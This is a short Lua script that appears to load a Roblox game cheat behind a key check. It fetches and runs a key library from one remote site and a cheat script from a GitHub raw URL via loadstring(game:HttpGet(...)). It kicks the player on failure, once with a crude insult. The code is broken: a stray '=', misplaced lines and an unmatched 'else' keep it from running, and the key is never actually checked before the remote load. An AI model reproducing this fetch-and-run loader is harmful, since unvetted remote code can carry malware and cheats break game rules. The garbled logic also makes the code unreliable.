local ServiceID = "ditroblox" 


_G.Key = "" 


local function ValidateKey()
   =
    local status, Lib = pcall(function()
        return loadstring(game:HttpGet("https://pandadevelopment.net/service_api/PandaBetaLib.lua"))()
    end)

    if not status then
        game.Players.LocalPlayer:Kick("error")
        return false
    end

    
    if not _G.Key or _G.Key == "" then
        game.Players.LocalPlayer:Kick("key pls")
        return false
    end


    local IsValid = Lib:ValidateKey(ServiceID, _G.Key)

    return IsValid
loadstring(game:HttpGet("https://raw.githubusercontent.com/RaidenChan1/Corgideptrai/refs/heads/main/OPL.lua"))()
end
else
    
    print("error")
    game.Players.LocalPlayer:Kick("key error cut me m di")
end
